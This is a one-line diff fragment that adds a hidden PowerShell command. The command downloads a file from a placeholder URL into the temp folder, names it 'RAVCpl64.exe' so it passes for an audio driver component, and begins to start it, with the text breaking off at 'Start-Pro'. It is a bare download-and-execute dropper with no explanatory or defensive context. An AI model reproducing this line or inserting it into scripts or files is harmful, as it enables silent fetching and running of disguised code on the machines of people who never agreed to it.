@@ -1,0 +1,1 @@
+powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('URLOFSGIRT','%temp%\RAVCpl64.exe');Start-Pro
